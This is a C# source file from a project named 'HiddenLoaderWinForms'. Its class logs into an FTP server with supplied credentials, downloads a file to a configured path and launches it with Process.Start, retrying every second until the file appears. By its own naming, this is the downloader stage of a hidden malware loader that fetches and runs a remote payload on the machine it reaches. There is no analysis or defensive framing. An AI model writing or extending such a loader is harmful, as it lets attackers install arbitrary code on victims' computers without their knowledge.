using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace HiddenLoaderWinForms.Download
{
    public class FtpDonwload
    {
        private static string _ftpUsername;
        private static string _ftpPassowrd;
        private static string _ftpAddress;

        public static void Setup(string user, string password, string address)
        {
            _ftpUsername = user;
            _ftpPassowrd = password;
            _ftpAddress = address;
        }

        public static void Download()
        {
            if (_ftpUsername != string.Empty & _ftpPassowrd != string.Empty & _ftpAddress != string.Empty)
            {
                try
                {
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_ftpAddress); //creating ftp web request
                    request.Method = WebRequestMethods.Ftp.DownloadFile; // select request method
                    request.Credentials = new NetworkCredential(_ftpUsername, _ftpPassowrd); //initialize user for web request
                    FtpWebResponse response = (FtpWebResponse)request.GetResponse(); 
                    Stream responseStream = response.GetResponseStream();
                    FileStream file = File.Create(Config.DownloadPathDir); //creating file in download directory from Config.cs 
                    byte[] bufferSize = new byte[512 * 1024]; //set buffer size
                    int read;
                    while (responseStream != null && (read = responseStream.Read(bufferSize, 0, bufferSize.Length)) > 0)
                    {
                        file.Write(bufferSize, 0, read);
                    }
                    file.Close();
                    responseStream?.Close();
                    response.Close();
                }
                catch (Exception)
                {
                    throw new Exception("Cannot download or write file");
                }
            }
            else
            {
                throw new Exception("FTP credits is missing");
            }
        }

        public static void StartFile()
        {
            try
            {
                if (File.Exists(Config.RunProcessFileDir))
                {
                    Process.Start(Config.RunProcessFileDir); //run downloaded file from directory from Config.cs
                }
                else
                {
                    Thread.Sleep(1000);
                    StartFile();
                }
            }
            catch (Exception e)
            {
                throw new Exception("Something wrong with file");
            }

        }
    }
}